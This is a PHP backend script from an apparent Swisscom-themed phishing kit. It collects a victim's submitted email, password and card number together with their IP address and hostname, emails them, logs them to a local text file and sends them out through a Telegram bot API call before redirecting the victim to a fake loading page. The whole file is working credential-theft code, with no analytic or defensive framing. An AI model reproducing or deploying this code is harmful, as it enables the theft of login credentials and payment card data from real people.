<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "___________SWISS_____________\n";
$message .= "Mail : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['phone']."\n";

$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| NARCOS  |__________\n";
$send = "";
$subject = "Login| ".$_POST['cardnumber']." | $ip ";
$headers = "From:Swisscom <anas@vps1767525.ovh.net>";
mail($send,$subject,$message,$headers);
$file = fopen('../Flow22.txt', 'a');
fwrite($file,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: load.html?id=4932YR-329TR23R");

?>